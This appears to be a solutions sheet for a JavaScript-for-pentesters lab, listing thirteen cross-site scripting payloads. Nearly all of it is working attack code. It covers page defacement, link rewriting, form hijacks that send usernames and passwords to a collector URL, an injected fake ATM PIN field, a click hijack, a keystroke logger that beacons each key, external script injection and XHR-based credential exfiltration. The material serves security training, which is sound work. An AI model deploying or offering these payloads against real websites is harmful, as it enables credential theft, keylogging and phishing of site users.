* Solution 1: Modifying HTML

<script>

document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
document.getElementsByTagName("h1")[0].innerHTML = "Found You";

</script>


* Solution 2: Changing Links

<script>

var links = document.getElementsByTagName("a");

for  (i=0; i < links.length; i++)
	
{
  links[i].href = "http://PentesterAcademy.com/topics";
  links[i].innerHTML = "Link Modified";
}

</script>


* Solution 3: Hijack Form Submit

<script>

function InterceptForm() 

{
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;
	new Image().src = "http://localhost/?username="+username+"&password="+password;
}

document.forms[0].onsubmit = InterceptForm;

</script>


* Solution 4: Modifying Form Fields

<script>

var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input, previous);
document.forms[0].action = "http://localhost/";

</script>


* Solution 5: Social Engineering

<script>

var input = document.createElement("h2");

input.innerHTML = "Website is Down. Please visit SecurityTube.net";

document.forms[0].parentNode.appendChild(input);
document.forms[0].parentNode.removeChild(document.forms[0]);

</script>


* Solution 6: Capture All Clicks

<script>

function CaughtClick () 

{
	location.href = "https://www.PentesterAcademy.com";
}

document.body.addEventListener('click', CaughtClick, true);

</script>


* Solution 7: Keystroke Logging

<script>
	
document.onkeypress = function KeyLogger(inp)

{
	key_pressed = String.fromCharCode(inp.which);
	new Image().src = "http://localhost/?" + key_pressed
}
	
</script>


* Solution 8: Event Listener

" onmouseover="

document.forms[0].onsubmit = function demo ()

{
	var pass = document.forms[0].elements[1].value;
	alert (pass);
}
	

* Solution 9: Include External JS

<script src="http://demofilespa.s3.amazonaws.com/jfptest.js"></script>


* Solution 10: Include External JS using JS

var newtag = document.createElement("script");
newtag.type = "text/javascript";
newtag.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
document.body.appendChild(newtag);


* Solution 11: Replace Banner

<script>
	
document.getElementsByTagName("img")[0].src = "https://pluralsight2.imgix.net/paths/images/javascript-542e10ea6e.png"

</script>


* Solution 12: Stealing from Auto-Complete

<script>
	
window.setTimeout(function() 

{
	document.forms[0].action = 'http://localhost';
	document.forms[0].submit();

},10000);
	
</script>


* Solution 13: Posting with XML HTTP Request

<script>

username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;

window.setTimeout(function() 

{
	var req = new XMLHTTPRequest();
	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
	req.send();

},10000);
	
</script>

